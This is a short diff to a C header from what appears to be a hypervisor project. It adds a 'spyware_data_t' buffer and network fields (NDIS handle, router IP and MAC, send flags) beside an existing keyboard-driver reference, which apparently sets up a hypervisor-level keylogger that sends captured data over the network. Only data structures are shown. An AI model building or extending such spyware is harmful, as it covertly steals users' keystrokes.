@@ -24,6 +24,11 @@ extern void __invept(invept_descriptor_t *descriptor, uint64_t type);
 #define CR0_NE (1 << 5)
 
 typedef struct {
+    uint16_t length;
+    byte_t chars[212];
+} spyware_data_t;
+
+typedef struct {
     word_t int15h_segment;
     word_t int15h_offset;
     dword_t allocation_lock;
@@ -33,6 +38,13 @@ typedef struct {
     msr_bitmaps_t *msr_bitmaps;
     qword_t ntoskrnl;
     qword_t kbdclass;
+    qword_t ndis;
+    dword_t router_ip;
+    byte_t router_mac[6];
+    BOOL mac_ready;
+    BOOL send_pending;
+    dword_t spyware_data_lock;
+    spyware_data_t spyware_data_buffer;
 } shared_cores_data_t;
 
 typedef struct __attribute__((__packed__)) {
@@ -82,4 +94,5 @@ typedef struct {
 
 extern void prepare_vmm(void);
 extern shared_cores_data_t shared_cores_data;
+
 #endif
